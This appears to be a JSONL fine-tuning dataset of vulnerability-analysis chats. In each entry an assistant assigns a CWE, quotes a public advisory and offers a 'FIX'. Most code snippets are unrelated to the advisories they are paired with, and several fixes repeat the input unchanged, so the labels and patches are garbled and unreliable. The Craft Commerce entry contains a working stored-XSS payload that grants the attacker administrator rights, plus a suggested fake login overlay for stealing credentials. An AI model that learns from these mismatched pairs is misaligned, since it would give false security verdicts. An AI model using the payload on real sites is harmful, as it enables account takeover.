kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"keep-alive\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist++;\n\t\telse\n\t\t\tclt->clt_persist = 0;\n\t}\n\n\tif (clt->clt_persist >= srv_conf->maxrequests)\n\t\tclt->clt_persist = 0;\n\n\t/*\n\t * Do we have a Host header and matching configuration?\n\t * XXX the Host can also appear in the URL path.\n\t */\n\tif (host != NULL) {\n\t\tif ((hostval = server_http_parsehost(host->kv_value,\n\t\t    hostname, sizeof(hostname), &portval)) == NULL)\n\t\t\tgoto fail;\n\n\t\tTAILQ_FOREACH(srv_conf, &srv->srv_hosts, entry) {\n#ifdef DEBUG\n\t\t\tif ((srv_conf->flags & SRVFLAG_LOCATION) == 0) {\n\t\t\t\tDPRINTF(\"%s: virtual host \\\"%s:%u\\\"\"\n\t\t\t\t    \" host \\\"%s\\\" (\\\"%s\\\")\",\n\t\t\t\t    __func__, srv_conf->name,\n\t\t\t\t    ntohs(srv_conf->port), host->kv_value,\n\t\t\t\t    hostname);\n\t\t\t}\n#endif\n\t\t\tif (srv_conf->flags & SRVFLAG_LOCATION)\n\t\t\t\tcontinue;\n\t\t\telse if (srv_conf->flags & SRVFLAG_SERVER_MATCH) {\n\t\t\t\tstr_find(hostname, srv_conf->name,\n\t\t\t\t    &sm, 1, &errstr);\n\t\t\t\tret = errstr == NULL ? 0 : -1;\n\t\t\t} else {\n\t\t\t\tret = fnmatch(srv_conf->name,\n\t\t\t\t    hostname, FNM_CASEFOLD);\n\t\t\t}\n\t\t\tif (ret == 0 &&\n\t\t\t    (portval == -1 ||\n\t\t\t    (portval != -1 && portval == srv_conf->port))) {\n\t\t\t\t/* Replace host configuration */\n\t\t\t\tclt->clt_srv_conf = srv_conf;\n\t\t\t\tsrv_conf = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (srv_conf != NULL) {\n\t\t/* Use the actual server IP address */\n\t\tif (server_http_host(&clt->clt_srv_ss, hostname,\n\t\t    sizeof(hostname)) == NULL)\n\t\t\tgoto fail;\n\t} else {\n\t\t/* Host header was valid and found */\n\t\tif (strlcpy(hostname, host->kv_value, sizeof(hostname)) >=\n\t\t    sizeof(hostname))\n\t\t\tgoto fail;\n\t\tsrv_conf = clt->clt_srv_conf;\n\t}\n\n\tif ((desc->http_host = strdup(hostname)) == NULL)\n\t\tgoto fail;\n\n\t/* Now fill in the mandatory parts of the response descriptor */\n\tresp->http_method = desc->http_method;\n\tif ((resp->http_version = strdup(desc->http_version)) == NULL)\n\t\tgoto fail;\n\n\t/* Now search for the location */\n\tsrv_conf = server_getlocation(clt, desc->http_path);\n\n\tif (srv_conf->flags & SRVFLAG_BLOCK) {\n\t\tserver_abort_http(clt, srv_conf->return_code,\n\t\t    srv_conf->return_uri);\n\t\treturn (-1);\n\t} else if (srv_conf->flags & SRVFLAG_AUTH &&\n\t    server_http_authenticate(srv_conf, clt) == -1) {\n\t\tserver_abort_http(clt, 401, srv_conf->auth_realm);\n\t\treturn (-1);\n\t} else\n\t\treturn (server_file(httpd, clt));\n fail:\n\tserver_abort_http(clt, 400, \"bad request\");\n\treturn (-1);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-770\nREASON: Unauthenticated users can trigger database backup operations the `updater/backup` action, potentially leading to resource exhaustion or information disclosure.\n\nUsers should update to the patched versions (5.8.21 and 4.16.17) to mitigate the issue.\n\nCraft 3 users should update to the latest Craft 4 and 5 releases, which include the fixes.\n\nReferences:\n\nhttps://github.com/craftcms/cms/commit/f83d4e0c6b906743206b4747db4abf8164b8da39\n\nhttps://github.com/craftcms/cms/blob/5.x/CHANGELOG.md#5821---2025-12-04\n\n## Affected Endpoints\n\n- `POST /admin/actions/updater/backup` (unauthenticated)\n\n## Vulnerability Details\n\n### Root Cause\nAll `updater/*` actions are explicitly configured with anonymous access:\n\n```php\n// BaseUpdaterController.php  \nprotected array|bool|int $allowAnonymous = self::ALLOW_ANONYMOUS_LIVE | self::ALLOW_ANONYMOUS_OFFLINE;\n```\n\n### Attack Vector\n1. Send unauthenticated POST request to `/admin/actions/updater/backup`\n2. Database backup executes with configured `backupCommand`\nFIX:\nserver_response(struct httpd *httpd, struct client *clt)\n{\n\tchar\t\t\t path[PATH_MAX];\n\tchar\t\t\t hostname[HOST_NAME_MAX+1];\n\tstruct http_descriptor\t*desc = clt->clt_descreq;\n\tstruct http_descriptor\t*resp = clt->clt_descresp;\n\tstruct server\t\t*srv = clt->clt_srv;\n\tstruct server_config\t*srv_conf = &srv->srv_conf;\n\tstruct kv\t\t*kv, key, *host;\n\tstruct str_find\t\t sm;\n\tint\t\t\t portval = -1, ret;\n\tchar\t\t\t*hostval;\n\tconst char\t\t*errstr = NULL;\n\n\t/* Canonicalize the request path */\n\tif (desc->http_path == NULL ||\n\t    url_decode(desc->http_path) == NULL ||\n\t    canonicalize_path(desc->http_path, path, sizeof(path)) == NULL)\n\t\tgoto fail;\n\tfree(desc->http_path);\n\tif ((desc->http_path = strdup(path)) == NULL)\n\t\tgoto fail;\n\n\tkey.kv_key = \"Host\";\n\tif ((host = kv_find(&desc->http_headers, &key)) != NULL &&\n\t    host->kv_value == NULL)\n\t\thost = NULL;\n\n\tif (strcmp(desc->http_version, \"HTTP/1.1\") == 0) {\n\t\t/* Host header is mandatory */\n\t\tif (host == NULL)\n\t\t\tgoto fail;\n\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"close\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist = 0;\n\t\telse\n\t\t\tclt->clt_persist++;\n\t} else {\n\t\t/* Is the connection persistent? */\n\t\tkey.kv_key = \"Connection\";\n\t\tif ((kv = kv_find(&desc->http_headers, &key)) != NULL &&\n\t\t    strcasecmp(\"keep-alive\", kv->kv_value) == 0)\n\t\t\tclt->clt_persist++;\n\t\telse\n\t\t\tclt->clt_persist = 0;\n\t}\n\n\tif (clt->clt_persist >= srv_conf->maxrequests)\n\t\tclt->clt_persist = 0;\n\n\t/*\n\t * Do we have a Host header and matching configuration?\n\t * XXX the Host can also appear in the URL path.\n\t */\n\tif (host != NULL) {\n\t\tif ((hostval = server_http_parsehost(host->kv_value,\n\t\t    hostname, sizeof(hostname), &portval)) == NULL)\n\t\t\tgoto fail;\n\n\t\tTAILQ_FOREACH(srv_conf, &srv->srv_hosts, entry) {\n#ifdef DEBUG\n\t\t\tif ((srv_conf->flags & SRVFLAG_LOCATION) == 0) {\n\t\t\t\tDPRINTF(\"%s: virtual host \\\"%s:%u\\\"\"\n\t\t\t\t    \" host \\\"%s\\\" (\\\"%s\\\")\",\n\t\t\t\t    __func__, srv_conf->name,\n\t\t\t\t    ntohs(srv_conf->port), host->kv_value,\n\t\t\t\t    hostname);\n\t\t\t}\n#endif\n\t\t\tif (srv_conf->flags & SRVFLAG_LOCATION)\n\t\t\t\tcontinue;\n\t\t\telse if (srv_conf->flags & SRVFLAG_SERVER_MATCH) {\n\t\t\t\tstr_find(hostname, srv_conf->name,\n\t\t\t\t    &sm, 1, &errstr);\n\t\t\t\tret = errstr == NULL ? 0 : -1;\n\t\t\t} else {\n\t\t\t\tret = fnmatch(srv_conf->name,\n\t\t\t\t    hostname, FNM_CASEFOLD);\n\t\t\t}\n\t\t\tif (ret == 0 &&\n\t\t\t    (portval == -1 ||\n\t\t\t    (portval != -1 && portval == srv_conf->port))) {\n\t\t\t\t/* Replace host configuration */\n\t\t\t\tclt->clt_srv_conf = srv_conf;\n\t\t\t\tsrv_conf = NULL;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (srv_conf != NULL) {\n\t\t/* Use the actual server IP address */\n\t\tif (server_http_host(&clt->clt_srv_ss, hostname,\n\t\t    sizeof(hostname)) == NULL)\n\t\t\tgoto fail;\n\t} else {\n\t\t/* Host header was valid and found */\n\t\tif (strlcpy(hostname, host->kv_value, sizeof(hostname)) >=\n\t\t    sizeof(hostname))\n\t\t\tgoto fail;\n\t\tsrv_conf = clt->clt_srv_conf;\n\t}\n\n\tif ((desc->http_host = strdup(hostname)) == NULL)\n\t\tgoto fail;\n\n\t/* Now fill in the mandatory parts of the response descriptor */\n\tresp->http_method = desc->http_method;\n\tif ((resp->http_version = strdup(desc->http_version)) == NULL)\n\t\tgoto fail;\n\n\t/* Now search for the location */\n\tsrv_conf = server_getlocation(clt, desc->http_path);\n\n\tif (srv_conf->flags & SRVFLAG_BLOCK) {\n\t\tserver_abort_http(clt, srv_conf->return_code,\n\t\t    srv_conf->return_uri);\n\t\treturn (-1);\n\t} else if (srv_conf->flags & SRVFLAG_AUTH &&\n\t    server_http_authenticate(srv_conf, clt) == -1) {\n\t\tserver_abort_http(clt, 401, srv_conf->auth_realm);\n\t\treturn (-1);\n\t} else\n\t\treturn (server_file(httpd, clt));\n fail:\n\tserver_abort_http(clt, 400, \"bad request\");\n\treturn (-1);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for kaniko has tar archive path traversal in its build context extraction, allowing file writes outside destination directories:\n\nvoid VirtualAuthenticator::AddRegistration(\n    blink::test::mojom::RegisteredKeyPtr registration,\n    AddRegistrationCallback callback) {\n  if (registration->application_parameter.size() != device::kRpIdHashLength) {\n    std::move(callback).Run(false);\n    return;\n  }\n\n  bool success = false;\n  std::tie(std::ignore, success) = state_->registrations.emplace(\n      std::move(registration->key_handle),\n       ::device::VirtualFidoDevice::RegistrationData(\n           crypto::ECPrivateKey::CreateFromPrivateKeyInfo(\n               registration->private_key),\n          registration->application_parameter, registration->counter));\n   std::move(callback).Run(success);\n }\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: kaniko unpacks build context archives using `filepath.Join(dest, cleanedName)` without enforcing that the final path stays within `dest`. A tar entry like `../outside.txt` escapes the extraction root and writes files outside the destination directory. In environments with registry authentication, this can be chained with docker credential helpers to achieve code execution within the executor process. Affected versions >= 1.25.4, <= 1.25.9.\n\n**Fix:** Merged with [PR #326](https://github.com/chainguard-forks/kaniko/pull/326) \u2014 uses securejoin for path resolution in tar extraction.\n\n**Acknowledgements**\n\nkaniko thanks Oleh Konko from [1seal](https://1seal.org/) for discovering and reporting this issue.\nFIX:\nvoid VirtualAuthenticator::AddRegistration(\n    blink::test::mojom::RegisteredKeyPtr registration,\n    AddRegistrationCallback callback) {\n  if (registration->application_parameter.size() != device::kRpIdHashLength) {\n    std::move(callback).Run(false);\n    return;\n  }\n\n  bool success = false;\n  std::tie(std::ignore, success) = state_->registrations.emplace(\n      std::move(registration->key_handle),\n       ::device::VirtualFidoDevice::RegistrationData(\n           crypto::ECPrivateKey::CreateFromPrivateKeyInfo(\n               registration->private_key),\n          base::make_span<device::kRpIdHashLength>(\n              registration->application_parameter),\n          registration->counter));\n   std::move(callback).Run(success);\n }\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Gradio allows users to access arbitrary files:\n\nvoid VirtualAuthenticator::AddRegistration(\n    blink::test::mojom::RegisteredKeyPtr registration,\n    AddRegistrationCallback callback) {\n  if (registration->application_parameter.size() != device::kRpIdHashLength) {\n    std::move(callback).Run(false);\n    return;\n  }\n\n  bool success = false;\n  std::tie(std::ignore, success) = state_->registrations.emplace(\n      std::move(registration->key_handle),\n       ::device::VirtualFidoDevice::RegistrationData(\n           crypto::ECPrivateKey::CreateFromPrivateKeyInfo(\n               registration->private_key),\n          registration->application_parameter, registration->counter));\n   std::move(callback).Run(success);\n }\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ### Impact\nThis vulnerability allows users of Gradio applications that have a public link (such as on Hugging Face Spaces) to access files on the machine hosting the Gradio application. This involves intercepting and modifying the network requests made by the Gradio app to the server. \n\n### Patches\nYes, the problem has been patched in Gradio version 4.19.2 or higher. We have no knowledge of this exploit being used against users of Gradio applications, but we encourage all users to upgrade to Gradio 4.19.2 or higher.\n\nFixed in: https://github.com/gradio-app/gradio/commit/16fbe9cd0cffa9f2a824a0165beb43446114eec7\nCVE: https://nvd.nist.gov/vuln/detail/CVE-2024-1728\nFIX:\nvoid VirtualAuthenticator::AddRegistration(\n    blink::test::mojom::RegisteredKeyPtr registration,\n    AddRegistrationCallback callback) {\n  if (registration->application_parameter.size() != device::kRpIdHashLength) {\n    std::move(callback).Run(false);\n    return;\n  }\n\n  bool success = false;\n  std::tie(std::ignore, success) = state_->registrations.emplace(\n      std::move(registration->key_handle),\n       ::device::VirtualFidoDevice::RegistrationData(\n           crypto::ECPrivateKey::CreateFromPrivateKeyInfo(\n               registration->private_key),\n          base::make_span<device::kRpIdHashLength>(\n              registration->application_parameter),\n          registration->counter));\n   std::move(callback).Run(success);\n }\n"}]}
{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n/* TEMPLATE GENERATED TESTCASE FILE\nFilename: CWE190_Integer_Overflow__unsigned_int_rand_preinc_51b.c\nLabel Definition File: CWE190_Integer_Overflow.label.xml\nTemplate File: sources-sinks-51b.tmpl.c\n*/\n/*\n * @description\n * CWE: 190 Integer Overflow\n * BadSource: rand Set data to result of rand()\n * GoodSource: Set data to a small, non-zero number (two)\n * Sinks: increment\n *    GoodSink: Ensure there will not be an overflow before incrementing data\n *    BadSink : Increment data, which can cause an overflow\n * Flow Variant: 51 Data flow: data passed as an argument from one function to another in different source files\n *\n * */\n\n#include \"std_testcase.h\"\n\n#ifndef OMITBAD\n\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_51b_badSink(unsigned int data)\n{\n    {\n        /* POTENTIAL FLAW: Incrementing data could cause an overflow */\n        ++data;\n        unsigned int result = data;\n        printUnsignedLine(result);\n    }\n}\n\n#endif /* OMITBAD */\n\n#ifndef OMITGOOD\n\n/* goodG2B uses the GoodSource with the BadSink */\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_51b_goodG2BSink(unsigned int data)\n{\n    {\n        /* POTENTIAL FLAW: Incrementing data could cause an overflow */\n        ++data;\n        unsigned int result = data;\n        printUnsignedLine(result);\n    }\n}\n\n/* goodB2G uses the BadSource with the GoodSink */\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_51b_goodB2GSink(unsigned int data)\n{\n    /* FIX: Add a check to prevent an overflow from occurring */\n    if (data < UINT_MAX)\n    {\n        ++data;\n        unsigned int result = data;\n        printUnsignedLine(result);\n    }\n    else\n    {\n        printLine(\"data value is too large to perform arithmetic safely.\");\n    }\n}\n\n#endif /* OMITGOOD */\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"integer_overflow\",\n  \"severity\": \"high\",\n  \"explanation\": \"This code performs arithmetic operations that can exceed the maximum size of the data type. This can lead to unexpected behavior, crashes, or security vulnerabilities.\",\n  \"risk\": \"Memory corruption, arbitrary code execution, denial of service, security bypass\",\n  \"compliant_patch\": \"\\n// FIXED: Add bounds checking before arithmetic operations\\n// Instead of: result = a + b;\\n// Use: if (b > INT_MAX - a) { handle_error(); }\\n//       result = a + b;\\n\\n// Or use safe arithmetic functions:\\n// if (!safe_add(a, b, &result)) { handle_error(); }\\n\",\n  \"source\": \"SARD-237272\",\n  \"cwe\": \"CWE-190\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Craft CMS has Stored XSS in Tax Rates Name Leading to Potential Privilege Escalation:\n\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ## Summary\nA stored XSS vulnerability in Craft Commerce allows attackers to execute malicious JavaScript in an administrator's browser. This occurs because the Tax Rates 'Name' field in the **Store Management** section is not properly sanitized before being displayed in the admin panel.\n\n## Proof of Concept\n\n### Requirments\n- General permissions:\n\t- Access the control panel\n\t- Access Craft Commerce\n- Craft Commerce permissions:\n\t- Manage store settings\n\t- Manage taxes\n- An active administrator elevated session\n\n\n### Steps to Reproduce\n1. Log in to the Admin Panel with the attacker account with the permissions mentioned above.\n2. Navigate to **Commerce** -> **Store Management** -> **Tax Rates** (`/admin/commerce/store-management/primary/taxrates`).\n3. Create a new tax rate.\n4. In the **Name** field, enter the following payload:\n```html\n<img src=x onerror=\"alert(document.domain)\">\n```\n4. Pick or create a Tax Category since it\u2019s required to save the tax rate.\n5. Click **Save** and you\u2019ll be redirected back to the previous page.\n6. Notice the alert proving JavaScript execution.\n<img width=\"1887\" height=\"709\" alt=\"poc-alert\" src=\"https://github.com/user-attachments/assets/cbcebb85-dbc7-467c-aca1-7446a67918f2\" />\n\n\n\n### Privilege Escalation to Administrator:\n1. Do the same steps above, but replace the payload with a malicious one.\n2. The following payload elevates the attacker\u2019s account to Admin if there\u2019s already an elevated session, replace the `<UserID>` with your attacker id:\n\n```html\n<img src=x onerror=\"fetch('/admin/users/<UserID>/permissions',{method:'POST',body:`CRAFT_CSRF_TOKEN=${Craft.csrfTokenValue}&userId=<UserID>&admin=1&action=users/save-permissions`,headers:{'content-type':'application/x-www-form-urlencoded'}})\">\n```\n4. In another browser, log in as an admin & go to the vulnerable page (tax rates page).\n5. Go back to your attacker account & notice you are now an admin.\n\nThe privilege escalation requires an elevated session. In a real-world scenario, an attacker can automate the process by forcing a logout if the victim\u2019s session is stale; upon re-authentication, the stored XSS payload executes within a fresh elevated session to complete the attack.\n\nOr even easier (and smarter), an attacker (using the XSS) can create a fake 'Session Expired' login modal overlay. Since it's on the trusted domain, administrators will likely enter their credentials, sending them directly to the attacker.\n\n### Resources:\n\nhttps://github.com/craftcms/commerce/commit/fa273330807807d05b564d37c88654cd772839ee\nFIX:\nMetricsWebContentsObserver::GetPageLoadExtraInfoForCommittedLoad() {\n  DCHECK(committed_load_);\n  return committed_load_->ComputePageLoadExtraInfo();\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for OpenClaw's Windows cmd.exe parsing may bypass exec allowlist/approval gating:\n\nstruct vdagent_file_xfers *vdagent_file_xfers_create(\n    struct udscs_connection *vdagentd, const char *save_dir,\n    int open_save_dir, int debug)\n{\n    struct vdagent_file_xfers *xfers;\n\n    xfers = g_malloc(sizeof(*xfers));\n    xfers->xfers = g_hash_table_new_full(g_direct_hash, g_direct_equal,\n                                         NULL, vdagent_file_xfer_task_free);\n    xfers->vdagentd = vdagentd;\n    xfers->save_dir = g_strdup(save_dir);\n    xfers->open_save_dir = open_save_dir;\n    xfers->debug = debug;\n\n    return xfers;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-78\nREASON: ### Summary\n\nOn Windows nodes, exec requests were executed via `cmd.exe /d /s /c <rawCommand>`. In allowlist/approval-gated mode, the allowlist analysis did not model Windows `cmd.exe` parsing and metacharacter behavior. A crafted command string could cause `cmd.exe` to interpret additional operations (for example command chaining via `&`, or expansion via `%...%` / `!...!`) beyond what was allowlisted/approved.\n\n### Affected Packages / Versions\n\n- Package: `openclaw` (npm)\n- Affected: `<= 2026.2.1`\n- Patched: `>= 2026.2.2`\n- Latest (npm) as of 2026-02-14: `2026.2.13`\n\n### Details\n\n- Default installs: Not affected unless you opt into exec allowlist/approval gating on Windows nodes.\n- Windows execution uses `cmd.exe` via `src/infra/node-shell.ts`.\n- The fix hardens Windows allowlist enforcement by:\n  - Passing the platform into allowlist analysis and rejecting Windows shell metacharacters.\n  - Treating `cmd.exe` invocation as not allowlist-safe on Windows.\n  - Avoiding `cmd.exe` entirely in allowlist mode by executing the parsed argv directly when possible.\n\n### Fix Commit(s)\n\n- `a7f4a53ce80c98ba1452eb90802d447fca9bf3d6`\n\nThanks @simecek for reporting.\nFIX:\nstruct vdagent_file_xfers *vdagent_file_xfers_create(\n    struct udscs_connection *vdagentd, const char *save_dir,\n    int open_save_dir, int debug)\n{\n    struct vdagent_file_xfers *xfers;\n\n    xfers = g_malloc(sizeof(*xfers));\n    xfers->xfers = g_hash_table_new_full(g_direct_hash, g_direct_equal,\n                                         NULL, vdagent_file_xfer_task_free);\n    xfers->vdagentd = vdagentd;\n    xfers->save_dir = g_strdup(save_dir);\n    xfers->open_save_dir = open_save_dir;\n    xfers->debug = debug;\n\n    return xfers;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for psd-tools: Compression module has unguarded zlib decompression, missing dimension validation, and hardening gaps:\n\ndecode_async_mask(ovs_be32 src,\n                  const struct ofp14_async_prop *ap, enum ofp_version version,\n                  bool loose, struct ofputil_async_cfg *dst)\n{\n    uint32_t mask = ntohl(src);\n    uint32_t allowed = ofp14_async_prop_allowed(ap, version);\n    if (mask & ~allowed) {\n        OFPPROP_LOG(&bad_ofmsg_rl, loose,\n                    \"bad value %#x for %s (allowed mask %#x)\",\n                    mask, ofputil_async_msg_type_to_string(ap->oam),\n                    allowed);\n        mask &= allowed;\n        if (!loose) {\n            return OFPERR_OFPACFC_INVALID;\n        }\n    }\n\n    if (ap->oam == OAM_PACKET_IN) {\n        if (mask & (1u << OFPR_NO_MATCH)) {\n            mask |= 1u << OFPR_EXPLICIT_MISS;\n            if (version < OFP13_VERSION) {\n                mask |= 1u << OFPR_IMPLICIT_MISS;\n            }\n        }\n    }\n\n    uint32_t *array = ap->master ? dst->master : dst->slave;\n    array[ap->oam] = mask;\n    return 0;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-617\nREASON: ## Summary\n\nA security review of the `psd_tools.compression` module (conducted against the `fix/invalid-rle-compression` branch, commits `7490ffa`\u2013`2a006f5`) identified the following pre-existing issues. The two findings introduced and **fixed** by those commits (Cython buffer overflow, `IndexError` on lone repeat header) are excluded from this report.\n\n---\n\n## Findings\n\n### 1. Unguarded `zlib.decompress` \u2014 ZIP bomb / memory exhaustion (Medium)\n\n**Location**: `src/psd_tools/compression/__init__.py`, lines 159 and 162\n\n```python\nresult = zlib.decompress(data)          # Compression.ZIP\ndecompressed = zlib.decompress(data)    # Compression.ZIP_WITH_PREDICTION\n```\n\n`zlib.decompress` is called without a `max_length` cap. A crafted PSD file containing a ZIP-compressed channel whose compressed payload expands to gigabytes would exhaust process memory before any limit is enforced. The RLE path is not vulnerable to this because the decoder pre-allocates exactly `row_size \u00d7 height` bytes; the ZIP path has no equivalent ceiling.\n\n**Impact**: Denial-of-service / OOM crash when processing untrusted PSD files.\n\n**Suggested mitigation**: Pass a reasonable `max_length` to `zlib.decompress`, derived from the expected `width * height * depth // 8` byte count already computed in `decompress()`.\n\n---\n\n### 2. No upper-bound validation on image dimensions before allocation (Low)\n\n**Location**: `src/psd_tools/compression/__init__.py`, lines 138 and 193\n\n```python\nlength = width * height * max(1, depth // 8)   # decompress()\nrow_size = max(width * depth // 8, 1)           # decode_rle()\n```\n\nNeither `width`, `height`, nor `depth` are range-checked before these values drive memory allocation. The PSD format (version 2 / PSB) permits dimensions up to 300,000 \u00d7 300,000 pixels; a 4-channel 32-bit image at that size would require ~144 TB to hold. While the OS/Python allocator will reject such a request, there is no early, explicit guard that produces a clean, user-facing error.\n\n**Impact**: Uncontrolled allocation attempt from a malformed or adversarially crafted PSB file; hard crash rather than a recoverable error.\n\n**Suggested mitigation**: Validate `width`, `height`, and `depth` against known PSD/PSB limits before entering decompression, and raise a descriptive `ValueError` early.\n\n---\n\n### 3. `assert` used as a runtime integrity check (Low)\n\n**Location**: `src/psd_tools/compression/__init__.py`, line 170\n\n```python\nassert len(result) == length, \"len=%d, expected=%d\" % (len(result), length)\n```\n\nThis assertion can be silently disabled by running the interpreter with `-O` (or `-OO`), which strips all `assert` statements. If the assertion ever becomes relevant (e.g., after future refactoring), disabling it would allow a length mismatch to propagate silently into downstream image compositing.\n\n**Impact**: Loss of an integrity guard in optimised deployments.\n\n**Suggested mitigation**: Replace with an explicit `if` + `raise ValueError(...)`.\n\n---\n\n### 4. `cdef int` indices vs. `Py_ssize_t size` type mismatch in Cython decoder (Low)\n\n**Location**: `src/psd_tools/compression/_rle.pyx`, lines 18\u201320\n\n```cython\ncdef int i = 0\ncdef int j = 0\ncdef int length = data.shape[0]\n```\n\nAll loop indices are C `signed int` (32-bit). The `size` parameter is `Py_ssize_t` (64-bit on modern platforms). The comparison `j < size` promotes `j` to `Py_ssize_t`, but if `j` wraps due to a row size exceeding `INT_MAX` (~2.1 GB), the resulting comparison is undefined behaviour in C. In practice, row sizes are bounded by PSD/PSB dimension limits and are unreachable at this scale; however, the mismatch is a latent defect if the function is ever called directly with large synthetic inputs.\n\n**Impact**: Theoretical infinite loop or UB at >2 GB row sizes; not reachable from standard PSD/PSB parsing.\n\n**Suggested mitigation**: Change `cdef int i`, `j`, `length` to `cdef Py_ssize_t`.\n\n---\n\n### 5. Silent data degradation not surfaced to callers (Informational)\n\n**Location**: `src/psd_tools/compression/__init__.py`, lines 144\u2013157\n\nThe tolerant RLE decoder (introduced in `2a006f5`) replaces malformed channel data with zero-padded (black) pixels and emits a `logger.warning`. This is the correct trade-off over crashing, but the warning is only observable if the caller has configured a log handler. The public `PSDImage` API does not surface channel-level decode failures to the user in any other way.\n\n**Impact**: A user parsing a silently corrupt file gets a visually wrong image with no programmatic signal to check.\n\n**Suggested mitigation**: Consider exposing a per-channel decode-error flag or raising a distinct warning category that users can filter or escalate via the `warnings` module.\n\n---\n\n### 6. `encode()` zero-length return type inconsistency in Cython (Informational)\n\n**Location**: `src/psd_tools/compression/_rle.pyx`, lines 66\u201367\n\n```cython\nif length == 0:\n    return data   # returns a memoryview, not an explicit std::string\n```\n\nAll other return paths return an explicit `cdef string result`. This path returns `data` (a `const unsigned char[:]` memoryview) and relies on Cython's implicit coercion to `bytes`. It is functionally equivalent today but is semantically inconsistent and fragile if Cython's coercion rules change in a future version.\n\n**Impact**: Potential silent breakage in future Cython versions; not a current security issue.\n\n**Suggested mitigation**: Replace `return data` with `return result` (the already-declared empty `string`).\n\n---\n\n## Environment\n\n- Branch: `fix/invalid-rle-compression`\n- Reviewed commits: `7490ffa`, `2a006f5`\n- Python: 3.x (Cython extension compiled for CPython)\nFIX:\ndecode_async_mask(ovs_be32 src,\n                  const struct ofp14_async_prop *ap, enum ofp_version version,\n                  bool loose, struct ofputil_async_cfg *dst)\n{\n    uint32_t mask = ntohl(src);\n    uint32_t allowed = ofp14_async_prop_allowed(ap, version);\n    if (mask & ~allowed) {\n        OFPPROP_LOG(&bad_ofmsg_rl, loose,\n                    \"bad value %#x for %s (allowed mask %#x)\",\n                    mask, ofputil_async_msg_type_to_string(ap->oam),\n                    allowed);\n        mask &= allowed;\n        if (!loose) {\n            return OFPERR_OFPACFC_INVALID;\n        }\n    }\n\n    if (ap->oam == OAM_PACKET_IN) {\n        if (mask & (1u << OFPR_NO_MATCH)) {\n            mask |= 1u << OFPR_EXPLICIT_MISS;\n            if (version < OFP13_VERSION) {\n                mask |= 1u << OFPR_IMPLICIT_MISS;\n            }\n        }\n    }\n\n    uint32_t *array = ap->master ? dst->master : dst->slave;\n    array[ap->oam] = mask;\n    return 0;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for FUXA Unauthenticated Remote Code Execution via Admin JWT Minting:\n\nvoid LocalFrame::SetTextZoomFactor(float factor) {\n  SetPageAndTextZoomFactors(page_zoom_factor_, factor);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-285\nREASON: ### Note\nGitHub incorrectly stated this vulnerability is identical to CVE-2025-69970, which describes the fact that authentication is disabled by default. This advisory describes an exploit chain that enables authentication bypass via the heartbeat refresh endpoint when authentication is enabled. This misleads users into thinking that enabling authentication would mitigate this vulnerability. Please see the patch for more information: https://github.com/frangoteam/FUXA/commit/fe82348d160904d0013b9a3e267d50158f5c7afb.\n\n### Description\nAn authentication bypass vulnerability in FUXA allows an unauthenticated, remote attacker to gain administrative access via the heartbeat refresh API and execute arbitrary code on the server. This affects FUXA through version 1.2.9 when authentication is enabled. This issue has been patched in FUXA version 1.2.10.\n\n### Impact\nAffected deployments are those with `runtime.settings.secureEnabled` set to `true`.\n\nExploitation allows an unauthenticated, remote attacker to bypass all authentication mechanisms and obtain administrative access to the FUXA instance by minting administrator JWTs via the heartbeat refresh endpoint. With these elevated privileges, the attacker can interact with administrative APIs, including intended features designed for automation and scripting, to execute arbitrary code in the context of the FUXA service. Depending on deployment configuration and permissions, this may lead to full system compromise and could further expose connected ICS/SCADA environments to follow-on actions.\n\n### Patches\nThis issue has been patched in FUXA version 1.2.10. Users are strongly encouraged to update to the latest available release.\nFIX:\nvoid LocalFrame::SetTextZoomFactor(float factor) {\n  SetPageAndTextZoomFactors(page_zoom_factor_, factor);\n}\n"}]}
